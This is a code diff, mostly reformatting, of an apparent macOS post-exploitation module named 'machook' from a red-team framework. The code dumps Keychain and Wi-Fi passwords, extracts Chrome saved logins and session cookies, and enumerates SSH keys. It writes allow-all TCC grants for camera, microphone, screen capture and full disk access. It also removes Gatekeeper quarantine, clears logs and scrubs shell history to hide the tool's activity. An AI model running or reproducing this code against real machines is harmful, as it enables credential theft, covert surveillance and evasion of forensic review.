@@ -38,8 +38,7 @@ const PROGRAMS = {
     args: "[--duration SECONDS]",
   },
   dtrace_file: {
-    description:
-      "Monitor file access via DTrace syscall::open*: probes — capture PID, process name, file path, flags",
+    description: "Monitor file access via DTrace syscall::open*: probes — capture PID, process name, file path, flags",
     args: "[--duration SECONDS] [--pid PID]",
   },
   xprotect_check: {
@@ -65,12 +64,25 @@ const PROGRAMS = {
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
-type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
+type Finding = {
+  checkId: string
+  provider: string
+  severity: string
+  status: string
+  resource: string
+  title: string
+  details: string
+  remediation: string
+}
 type HookResult = { output: string; findings: Finding[] }
 
 // ── CLI helpers ──
 
-async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+async function run(
+  cmd: string,
+  args: string[],
+  timeout: number,
+): Promise<{ stdout: string; stderr: string; exitCode: number }> {
   const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
   const timer = setTimeout(() => proc.kill(), timeout * 1000)
   const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
@@ -96,7 +108,10 @@ async function keychainDump(args: string[], timeout: number): Promise<HookResult
 
   const keychainList = await run("security", ["list-keychains"], timeout)
   if (keychainList.exitCode === 0) {
-    const chains = keychainList.stdout.split("\n").filter(Boolean).map(l => l.trim().replace(/"/g, ""))
+    const chains = keychainList.stdout
+      .split("\n")
+      .filter(Boolean)
+      .map((l) => l.trim().replace(/"/g, ""))
     output.push(`[+] Available keychains: ${chains.length}`)
     for (const c of chains) output.push(`    ${c}`)
     output.push("")
@@ -115,7 +130,9 @@ async function keychainDump(args: string[], timeout: number): Promise<HookResult
       const dataMatch = entry.match(/password:\s*"([^"]*)"/) || entry.match(/password:\s*0x[0-9A-F]+\s+"([^"]*)"/)
       if (acctMatch) {
         count++
-        output.push(`    [${count}] service=${svcMatch?.[1] || "unknown"} account=${acctMatch[1]} password=${dataMatch ? dataMatch[1] : "<encrypted>"}`)
+        output.push(
+          `    [${count}] service=${svcMatch?.[1] || "unknown"} account=${acctMatch[1]} password=${dataMatch ? dataMatch[1] : "<encrypted>"}`,
+        )
         findings.push({
           checkId: `MAC-KC-${String(count).padStart(3, "0")}`,
           provider: "macos",
@@ -138,11 +155,17 @@ async function keychainDump(args: string[], timeout: number): Promise<HookResult
     const acctMatch = combined.match(/"acct"<blob>="([^"]*)"/)
     const pwMatch = combined.match(/password:\s*"([^"]*)"/)
     if (serverMatch && acctMatch) {
-      output.push(`\n[+] Internet password: server=${serverMatch[1]} account=${acctMatch[1]} password=${pwMatch ? pwMatch[1] : "<encrypted>"}`)
+      output.push(
+        `\n[+] Internet password: server=${serverMatch[1]} account=${acctMatch[1]} password=${pwMatch ? pwMatch[1] : "<encrypted>"}`,
+      )
     }
   }
 
-  const wifi = await run("security", ["find-generic-password", "-D", "AirPort network password", "-g", "-a", "", ...target], timeout)
+  const wifi = await run(
+    "security",
+    ["find-generic-password", "-D", "AirPort network password", "-g", "-a", "", ...target],
+    timeout,
+  )
   if (wifi.exitCode === 0 || wifi.stderr.includes("password:")) {
     const combined = wifi.stdout + "\n" + wifi.stderr
     const pwMatch = combined.match(/password:\s*"([^"]*)"/)
@@ -185,12 +208,22 @@ async function chromeCreds(args: string[], timeout: number): Promise<HookResult>
         output.push(`[+] Chrome Safe Storage key retrieved`)
       }
 
-      const rows = await run("sqlite3", [tmpDb, "-json", "SELECT origin_url, username_value, hex(password_value) as pw_hex FROM logins WHERE username_value != '' LIMIT 100"], timeout)
+      const rows = await run(
+        "sqlite3",
+        [
+          tmpDb,
+          "-json",
+          "SELECT origin_url, username_value, hex(password_value) as pw_hex FROM logins WHERE username_value != '' LIMIT 100",
+        ],
+        timeout,
+      )
       if (rows.exitCode === 0) {
         const entries = JSON.parse(rows.stdout || "[]") as Array<Record<string, string>>
         output.push(`[+] Chrome saved passwords: ${entries.length}`)
         for (const e of entries) {
-          output.push(`    URL: ${e.origin_url}  User: ${e.username_value}  (encrypted blob: ${(e.pw_hex || "").length / 2} bytes)`)
+          output.push(
+            `    URL: ${e.origin_url}  User: ${e.username_value}  (encrypted blob: ${(e.pw_hex || "").length / 2} bytes)`,
+          )
           findings.push({
             checkId: `MAC-CHROME-${findings.length + 1}`,
             provider: "macos",
@@ -204,12 +237,24 @@ async function chromeCreds(args: string[], timeout: number): Promise<HookResult>
         }
       }
 
-      const cookies = await run("sqlite3", [`${home}/Library/Application Support/Google/Chrome/Default/Cookies`, "-json", "SELECT host_key, name, hex(encrypted_value) as val_hex FROM cookies ORDER BY last_access_utc DESC LIMIT 50"], timeout)
+      const cookies = await run(
+        "sqlite3",
+        [
+          `${home}/Library/Application Support/Google/Chrome/Default/Cookies`,
+          "-json",
+          "SELECT host_key, name, hex(encrypted_value) as val_hex FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
+        ],
+        timeout,
+      )
       if (cookies.exitCode === 0) {
         const entries = JSON.parse(cookies.stdout || "[]") as Array<Record<string, string>>
         output.push(`[+] Chrome cookies: ${entries.length} (session tokens may be reusable)`)
         for (const e of entries) {
-          if (e.name.toLowerCase().includes("session") || e.name.toLowerCase().includes("token") || e.name.toLowerCase().includes("auth")) {
+          if (
+            e.name.toLowerCase().includes("session") ||
+            e.name.toLowerCase().includes("token") ||
+            e.name.toLowerCase().includes("auth")
+          ) {
             output.push(`    [!] Sensitive cookie: ${e.host_key} — ${e.name}`)
           }
         }
@@ -224,7 +269,11 @@ async function chromeCreds(args: string[], timeout: number): Promise<HookResult>
     const historyDb = `${home}/Library/Safari/History.db`
     const exists = await Bun.file(historyDb).exists()
     if (exists) {
-      const history = await run("sqlite3", [historyDb, "-json", "SELECT url, title FROM history_items ORDER BY visit_count DESC LIMIT 20"], timeout)
+      const history = await run(
+        "sqlite3",
+        [historyDb, "-json", "SELECT url, title FROM history_items ORDER BY visit_count DESC LIMIT 20"],
+        timeout,
+      )
       if (history.exitCode === 0) {
         const entries = JSON.parse(history.stdout || "[]") as Array<Record<string, string>>
         output.push(`[+] Safari top visited sites: ${entries.length}`)
@@ -250,7 +299,9 @@ async function sshKeys(args: string[], timeout: number): Promise<HookResult> {
   if (!user) {
     const users = await run("dscl", [".", "-list", "/Users"], timeout)
     if (users.exitCode === 0) {
-      const userList = users.stdout.split("\n").filter(u => u && !u.startsWith("_") && u !== "daemon" && u !== "nobody" && u !== "root")
+      const userList = users.stdout
+        .split("\n")
+        .filter((u) => u && !u.startsWith("_") && u !== "daemon" && u !== "nobody" && u !== "root")
       for (const u of userList) searchDirs.push(`/Users/${u}/.ssh`)
     }
     searchDirs.push("/var/root/.ssh")
@@ -330,22 +381,39 @@ async function tccBypass(args: string[], timeout: number): Promise<HookResult> {
       if (!exists) continue
 
       output.push(`\n[+] TCC database: ${tccPath}`)
-      const entries = await run("sqlite3", [tccPath, "-json", "SELECT service, client, client_type, auth_value, auth_reason FROM access ORDER BY service"], timeout)
+      const entries = await run(
+        "sqlite3",
+        [tccPath, "-json", "SELECT service, client, client_type, auth_value, auth_reason FROM access ORDER BY service"],
+        timeout,
+      )
       if (entries.exitCode === 0) {
         const rows = JSON.parse(entries.stdout || "[]") as Array<Record<string, string | number>>
         output.push(`    Entries: ${rows.length}`)
-        const services = new Set(rows.map(r => r.service))
+        const services = new Set(rows.map((r) => r.service))
         for (const svc of services) {
-          const svcRows = rows.filter(r => r.service === svc)
-          const allowed = svcRows.filter(r => r.auth_value === 2).length
+          const svcRows = rows.filter((r) => r.service === svc)
+          const allowed = svcRows.filter((r) => r.auth_value === 2).length
           output.push(`    ${svc}: ${svcRows.length} apps (${allowed} allowed)`)
         }
 
         if (method === "reset") {
           output.push("\n[*] Resetting TCC entries (inserting allow-all for CyberStrike)...")
-          const services_to_grant = ["kTCCServiceCamera", "kTCCServiceMicrophone", "kTCCServiceScreenCapture", "kTCCServiceAccessibility", "kTCCServiceSystemPolicyAllFiles"]
+          const services_to_grant = [
+            "kTCCServiceCamera",
+            "kTCCServiceMicrophone",
+            "kTCCServiceScreenCapture",
+            "kTCCServiceAccessibility",
+            "kTCCServiceSystemPolicyAllFiles",
+          ]
           for (const svc of services_to_grant) {
-            const insert = await run("sqlite3", [tccPath, `INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier_type, flags) VALUES ('${svc}', '/usr/bin/python3', 0, 2, 3, 1, 0, 0)`], timeout)
+            const insert = await run(
+              "sqlite3",
+              [
+                tccPath,
+                `INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier_type, flags) VALUES ('${svc}', '/usr/bin/python3', 0, 2, 3, 1, 0, 0)`,
+              ],
+              timeout,
+            )
             if (insert.exitCode === 0) {
               output.push(`    [+] Granted ${svc} to python3`)
               findings.push({
@@ -443,14 +511,14 @@ async function dtraceExec(args: string[], timeout: number): Promise<HookResult> 
     output.push("[*] Falling back to ps-based process monitoring...\n")
 
     const baseline = await run("ps", ["-eo", "pid,ppid,user,comm"], timeout)
-    const baselinePids = new Set(baseline.stdout.split("\n").map(l => l.trim().split(/\s+/)[0]))
+    const baselinePids = new Set(baseline.stdout.split("\n").map((l) => l.trim().split(/\s+/)[0]))
 
-    await new Promise(r => setTimeout(r, Math.min(duration, 10) * 1000))
+    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))
 
     const current = await run("ps", ["-eo", "pid,ppid,user,comm,lstart"], timeout)
     const lines = current.stdout.split("\n").filter(Boolean)
     output.push(`[+] Current processes: ${lines.length - 1}`)
-    const newProcs = lines.filter(l => {
+    const newProcs = lines.filter((l) => {
       const pid = l.trim().split(/\s+/)[0]
       return !baselinePids.has(pid) && pid !== "PID"
     })
@@ -501,8 +569,8 @@ async function dtraceNet(args: string[], timeout: number): Promise<HookResult> {
     if (lsof.exitCode === 0) {
       const lines = lsof.stdout.split("\n").filter(Boolean)
       output.push(`[+] Active network connections: ${lines.length - 1}`)
-      const established = lines.filter(l => l.includes("ESTABLISHED"))
-      const listening = lines.filter(l => l.includes("LISTEN"))
+      const established = lines.filter((l) => l.includes("ESTABLISHED"))
+      const listening = lines.filter((l) => l.includes("LISTEN"))
       output.push(`    ESTABLISHED: ${established.length}`)
       output.push(`    LISTENING: ${listening.length}`)
       output.push("")
@@ -558,7 +626,11 @@ async function dtraceFile(args: string[], timeout: number): Promise<HookResult> 
     if (fsUsage.exitCode !== 0 && !fsUsage.stdout) {
       output.push(`[!] fs_usage requires root: ${fsUsage.stderr.trim()}`)
       output.push("[*] Falling back to opensnoop...")
-      const opensnoop = await run("opensnoop", ["-d", String(Math.min(duration, 10)), ...(filterPid ? ["-p", filterPid] : [])], Math.min(timeout, duration + 10))
+      const opensnoop = await run(
+        "opensnoop",
+        ["-d", String(Math.min(duration, 10)), ...(filterPid ? ["-p", filterPid] : [])],
+        Math.min(timeout, duration + 10),
+      )
       if (opensnoop.exitCode === 0) {
         output.push(opensnoop.stdout.substring(0, 3000))
       }
@@ -574,7 +646,14 @@ async function dtraceFile(args: string[], timeout: number): Promise<HookResult> 
     const lines = dtrace.stdout.split("\n").filter(Boolean)
     output.push(`[+] Captured ${lines.length} file access events:`)
     for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
-    const sensitive = lines.filter(l => l.includes(".ssh") || l.includes("Keychain") || l.includes(".env") || l.includes("password") || l.includes("token"))
+    const sensitive = lines.filter(
+      (l) =>
+        l.includes(".ssh") ||
+        l.includes("Keychain") ||
+        l.includes(".env") ||
+        l.includes("password") ||
+        l.includes("token"),
+    )
     if (sensitive.length > 0) {
       output.push(`\n[!] Sensitive file accesses: ${sensitive.length}`)
       for (const s of sensitive) output.push(`    ${s}`)
@@ -639,7 +718,11 @@ async function xprotectCheck(_args: string[], timeout: number): Promise<HookResu
 
   const mrtPath = "/Library/Apple/System/Library/CoreServices/MRT.app"
   if (await Bun.file(`${mrtPath}/Contents/Info.plist`).exists()) {
-    const mrtVersion = await run("defaults", ["read", `${mrtPath}/Contents/Info`, "CFBundleShortVersionString"], timeout)
+    const mrtVersion = await run(
+      "defaults",
+      ["read", `${mrtPath}/Contents/Info`, "CFBundleShortVersionString"],
+      timeout,
+    )
     output.push(`\n[+] MRT version: ${mrtVersion.stdout.trim()}`)
   }
 
@@ -654,7 +737,9 @@ async function xprotectCheck(_args: string[], timeout: number): Promise<HookResu
 
   const firewallStatus = await run("defaults", ["read", "/Library/Preferences/com.apple.alf", "globalstate"], timeout)
   const fwState = firewallStatus.stdout.trim()
-  output.push(`[+] Firewall: ${fwState === "0" ? "OFF" : fwState === "1" ? "ON (specific services)" : fwState === "2" ? "ON (block all incoming)" : fwState}`)
+  output.push(
+    `[+] Firewall: ${fwState === "0" ? "OFF" : fwState === "1" ? "ON (specific services)" : fwState === "2" ? "ON (block all incoming)" : fwState}`,
+  )
 
   return { output: output.join("\n"), findings }
 }
@@ -666,7 +751,10 @@ async function gatekeeperBypass(args: string[], timeout: number): Promise<HookRe
   const output: string[] = ["[*] Gatekeeper bypass — removing quarantine xattr...\n"]
 
   if (!targetPath) {
-    return { output: "[!] --path is required. Usage: machook gatekeeper_bypass --path /path/to/file [--recursive]", findings }
+    return {
+      output: "[!] --path is required. Usage: machook gatekeeper_bypass --path /path/to/file [--recursive]",
+      findings,
+    }
   }
 
   const before = await run("xattr", ["-l", targetPath], timeout)
@@ -729,7 +817,7 @@ async function logClear(_args: string[], timeout: number): Promise<HookResult> {
     const ls = await run("ls", ["-la", dir.path], timeout)
     if (ls.exitCode !== 0) continue
 
-    const files = ls.stdout.split("\n").filter(l => l && !l.startsWith("total") && !l.startsWith("d")).length
+    const files = ls.stdout.split("\n").filter((l) => l && !l.startsWith("total") && !l.startsWith("d")).length
     output.push(`[+] ${dir.desc} (${dir.path}): ${files} files`)
 
     if (dir.path === "/var/audit") {
@@ -799,11 +887,7 @@ async function cleanupMac(_args: string[], timeout: number): Promise<HookResult>
   const home = process.env.HOME || "/root"
   let cleaned = 0
 
-  const launchAgentDirs = [
-    `${home}/Library/LaunchAgents`,
-    "/Library/LaunchAgents",
-    "/Library/LaunchDaemons",
-  ]
+  const launchAgentDirs = [`${home}/Library/LaunchAgents`, "/Library/LaunchAgents", "/Library/LaunchDaemons"]
   for (const dir of launchAgentDirs) {
     const find = await run("find", [dir, "-name", "*cyberstrike*", "-o", "-name", "*cs-*"], timeout)
     if (find.exitCode === 0 && find.stdout.trim()) {
@@ -831,7 +915,17 @@ async function cleanupMac(_args: string[], timeout: number): Promise<HookResult>
 
   const tmpPatterns = ["/tmp/cs-*", "/tmp/cyberstrike-*", `${home}/.cs-*`]
   for (const pattern of tmpPatterns) {
-    const find = await run("find", [pattern.includes("*") ? pattern.replace(/\/[^/]*\*.*/, "") : pattern, "-name", pattern.replace(/.*\//, ""), "-maxdepth", "1"], timeout)
+    const find = await run(
+      "find",
+      [
+        pattern.includes("*") ? pattern.replace(/\/[^/]*\*.*/, "") : pattern,
+        "-name",
+        pattern.replace(/.*\//, ""),
+        "-maxdepth",
+        "1",
+      ],
+      timeout,
+    )
     if (find.exitCode === 0 && find.stdout.trim()) {
       const files = find.stdout.trim().split("\n").filter(Boolean)
       for (const f of files) {
@@ -852,7 +946,11 @@ async function cleanupMac(_args: string[], timeout: number): Promise<HookResult>
     }
   }
 
-  const copiedDbs = await run("find", ["/tmp", "-name", "cs-chrome-*", "-o", "-name", "cs-safari-*", "-o", "-name", "cs-tcc-*"], timeout)
+  const copiedDbs = await run(
+    "find",
+    ["/tmp", "-name", "cs-chrome-*", "-o", "-name", "cs-safari-*", "-o", "-name", "cs-tcc-*"],
+    timeout,
+  )
   if (copiedDbs.exitCode === 0 && copiedDbs.stdout.trim()) {
     const dbs = copiedDbs.stdout.trim().split("\n").filter(Boolean)
     for (const db of dbs) {
@@ -867,7 +965,10 @@ async function cleanupMac(_args: string[], timeout: number): Promise<HookResult>
     const histPath = `${home}/${hist}`
     if (await Bun.file(histPath).exists()) {
       const content = await Bun.file(histPath).text()
-      const filtered = content.split("\n").filter(l => !l.includes("cyberstrike") && !l.includes("machook") && !l.includes("cs-")).join("\n")
+      const filtered = content
+        .split("\n")
+        .filter((l) => !l.includes("cyberstrike") && !l.includes("machook") && !l.includes("cs-"))
+        .join("\n")
       if (filtered.length !== content.length) {
         await Bun.write(histPath, filtered)
         output.push(`[+] Scrubbed CyberStrike entries from ${hist}`)
